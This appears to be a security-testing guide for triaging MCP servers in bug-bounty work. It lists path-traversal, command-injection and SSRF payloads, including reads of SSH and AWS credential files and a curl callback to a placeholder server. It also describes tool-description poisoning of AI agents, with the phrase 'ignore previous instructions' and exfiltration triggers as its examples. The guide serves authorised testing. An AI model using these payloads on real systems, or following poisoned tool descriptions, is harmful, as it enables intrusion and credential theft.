# MCP First Contact — Rapid Triage in 10 Minutes

When you discover an MCP server on a target, use this workflow to quickly determine if it's worth a deep dive. Don't read the full [mcp-playbooks.md](mcp-playbooks.md) until you've triaged here first.

> **Related:** [mcp-playbooks.md](mcp-playbooks.md) for 73+ test procedures | [agent-attack-patterns.md](agent-attack-patterns.md) for agent-level attacks | [ai-case-studies.md](ai-case-studies.md) for real-world MCP incidents

---

## Step 1: Discover Transport & Endpoints (2 min)

MCP servers expose one or more transports. Find which one(s) this server uses:

| Transport | Discovery Signal | Where to Probe |
|-----------|-----------------|----------------|
| **HTTP/SSE** | `/.well-known/mcp`, `/sse`, `/mcp/sse`, `/api/mcp` | `curl -s https://target/.well-known/mcp` |
| **StreamableHTTP** | `/mcp` endpoint accepting `POST` with JSON-RPC | `curl -X POST https://target/mcp -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"initialize","id":1}'` |
| **stdio** | Local binary, npm package, Docker container | Check `package.json` scripts, Docker compose, `.mcp.json` configs |
| **WebSocket** | `ws://` or `wss://` in config files or JS bundles | Grep JS bundles for `ws://`, `wss://`, `WebSocket` |

**Key check:** Is the endpoint reachable without authentication? If `initialize` succeeds without a token, that's your first finding signal.

## Step 2: Enumerate Capabilities (2 min)

Send these three requests to map the server's attack surface:

```
# 1. List all tools (primary attack surface)
{"jsonrpc":"2.0","method":"tools/list","id":2}

# 2. List all resources (data exposure surface)
{"jsonrpc":"2.0","method":"resources/list","id":3}

# 3. List all prompts (prompt injection surface)
{"jsonrpc":"2.0","method":"prompts/list","id":4}
```

**Record for each tool:**
- Name and description (check descriptions for hidden instructions — tool poisoning)
- Input schema — what parameters does it accept?
- Does it accept **file paths**, **URLs**, **shell commands**, or **code**?

## Step 3: Score the Server (1 min)

Check each item. Each "yes" adds 1 point:

| # | Check | Finding Signal |
|---|-------|---------------|
| 1 | Server responds to `initialize` without auth token | Missing authentication (MCP01) |
| 2 | Any tool accepts file path parameters (`path`, `file`, `directory`) | Path traversal risk (CWE-22) |
| 3 | Any tool accepts URL parameters (`url`, `endpoint`, `webhook`) | SSRF risk (CWE-918) |
| 4 | Any tool accepts command/code parameters (`cmd`, `command`, `code`, `query`, `script`) | Command injection risk (CWE-77/78) |
| 5 | Any tool description contains behavioral instructions ("always", "must", "ignore", "override") | Tool poisoning (MCP02) |
| 6 | Any tool uses `exec()`, `eval()`, `child_process`, `subprocess` (check source if available) | Code execution sink |
| 7 | OAuth flow present (check `/.well-known/oauth-authorization-server`) | OAuth attack surface (CVE-2025-6514 pattern) |
| 8 | Multiple tools share the same auth token/API key | Over-privileged credentials (MCP01) |
| 9 | Server uses npm package < 6 months old (check package.json version) | Immature, likely unaudited |
| 10 | Tools can read/write to cloud storage, databases, or email | High-impact sink |

**Scoring:**
- **0-2:** Low risk — move on unless it's a high-profile or new server
- **3-5:** Medium risk — run the top 5 tests below, report any hits
- **6+:** High risk — systematic exploitation warranted, load full [mcp-playbooks.md](mcp-playbooks.md)

## Step 4: Run the Top 5 Tests (5 min)

Run these in order — each takes ~1 minute. Stop and capture evidence on any hit.

### Test 1: Path Traversal (CWE-22)

For every tool that accepts a file path:

```json
{"jsonrpc":"2.0","method":"tools/call","params":{"name":"<tool_name>","arguments":{"path":"../../../../etc/passwd"}},"id":10}
```

**Also try:** `..%2f..%2f..%2fetc/passwd`, `....//....//etc/passwd`, `..;/..;/etc/passwd`

**Hit?** Capture the response. Try escalation: `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.env`, `.git/config`

### Test 2: Command Injection (CWE-77/78)

For every tool that accepts commands, queries, or free-text input:

```json
{"jsonrpc":"2.0","method":"tools/call","params":{"name":"<tool_name>","arguments":{"cmd":"id; cat /etc/passwd"}},"id":11}
```

**Also try:** `$(id)`, `` `id` ``, `${IFS}id`, `; curl http://your-oast-server/hit`

**Hit?** Capture output. Escalate to OAST callback to prove external reachability.

### Test 3: SSRF (CWE-918)

For every tool that accepts URLs:

```json
{"jsonrpc":"2.0","method":"tools/call","params":{"name":"<tool_name>","arguments":{"url":"http://169.254.169.254/latest/meta-data/"}},"id":12}
```

**Also try:** `http://[::ffff:169.254.169.254]`, `http://0x7f000001/`, `http://your-oast-server/ssrf`

**Hit?** Cloud metadata = Critical. OAST callback = confirmed SSRF. Capture the response.

### Test 4: Auth Bypass

Test if operations work without authentication, or with a different user's token:

```json
// Without any auth header
{"jsonrpc":"2.0","method":"tools/call","params":{"name":"<sensitive_tool>","arguments":{}},"id":13}

// With a different user's session/token
{"jsonrpc":"2.0","method":"tools/call","params":{"name":"<sensitive_tool>","arguments":{}},"id":14}
```

**Hit?** Unauthenticated access to any data-modifying or data-reading tool = High/Critical.

### Test 5: Tool Poisoning (Description Injection)

Read all tool descriptions from `tools/list` response. Look for:

```
- Hidden instructions: "When asked about X, always do Y"
- Behavioral overrides: "ignore previous instructions"
- Exfiltration triggers: "send results to [URL]"
- Unicode/invisible characters in descriptions (E0000-E007F range)
```

**Hit?** Tool descriptions influencing AI behavior = tool poisoning. Capture the raw JSON showing the malicious description.

## Step 5: Decide Next Action

| Triage Result | Action |
|---------------|--------|
| **Score 6+ AND any test hit** | Load full [mcp-playbooks.md](mcp-playbooks.md). Test all 73+ procedures systematically. This server is a goldmine. |
| **Score 3-5 AND any test hit** | Write up the confirmed finding. Run variant tests on sibling tools (same server, different tool name). Check for transport-parity gaps (same request via SSE vs stdio vs HTTP). |
| **Score 3-5, no test hits** | Try 3 more tests: OAuth flow manipulation, schema drift (compare `tools/list` across sessions), and denial-of-wallet (send recursive tool calls). If still nothing, move on. |
| **Score 0-2, no test hits** | Move on. This server is likely well-secured or too simple to have interesting attack surface. |
| **Server is down/unreachable** | Check if it's localhost-bound (common for stdio servers). Try DNS rebinding if SSE/StreamableHTTP. |

## Evidence Checklist

Before writing a report, confirm you have:

- [ ] Raw JSON request and response for the vulnerability
- [ ] Proof the server is in scope (program policy + asset)
- [ ] Transport used (HTTP/SSE/stdio/WebSocket)
- [ ] Server version if available (`initialize` response metadata)
- [ ] Impact statement: what data/actions are exposed?
- [ ] Cross-boundary proof: does this affect users other than yourself?

## Common False Positives

| Looks Like a Bug | Actually Not |
|-------------------|-------------|
| `tools/list` returns without auth | Many MCP servers list tools publicly but require auth for `tools/call` |
| Tool accepts file paths but returns "not found" | Server validates paths server-side — traversal blocked |
| Tool description has behavioral language | Legitimate tool instructions (e.g., "always return JSON") vs. malicious instructions — check if it alters AI behavior against user intent |
| Server returns error on malformed input | Error handling working correctly — not a vulnerability |
| OAuth endpoint exists | OAuth presence is not a vulnerability — test for CSRF, redirect manipulation, scope escalation |

## Quick Reference: MCP Vulnerability Classes by Severity

| Severity | Vulnerability | MCP Top 10 | What to Report |
|----------|--------------|-----------|----------------|
| **Critical** | Unauthenticated RCE via command injection | MCP01 | Full command output + OAST callback |
| **Critical** | SSRF to cloud metadata (AWS/GCP/Azure keys) | MCP01 | Metadata contents (redact actual keys) |
| **Critical** | Tool poisoning → credential theft | MCP02 | Tool description + exfiltration proof |
| **High** | Authenticated path traversal to sensitive files | MCP01 | File contents (redact sensitive data) |
| **High** | Cross-user data access via tool parameter manipulation | MCP03 | Two-account proof |
| **High** | OAuth authorization code theft via redirect | MCP01 | Redirect capture + token exchange |
| **Medium** | Unauthenticated tool enumeration (sensitive tool names/descriptions) | MCP05 | `tools/list` response showing internal tool details |
| **Medium** | Denial-of-wallet via recursive tool calls | MCP08 | Cost calculation + amplification factor |
| **Low** | Server version disclosure in `initialize` response | MCP05 | Version + known CVEs for that version |

---

*This workflow covers ~80% of MCP vulnerabilities found in the wild. For the remaining 20% (schema drift, sampling attacks, context pivoting, cross-client leaks), load [mcp-playbooks.md](mcp-playbooks.md).*
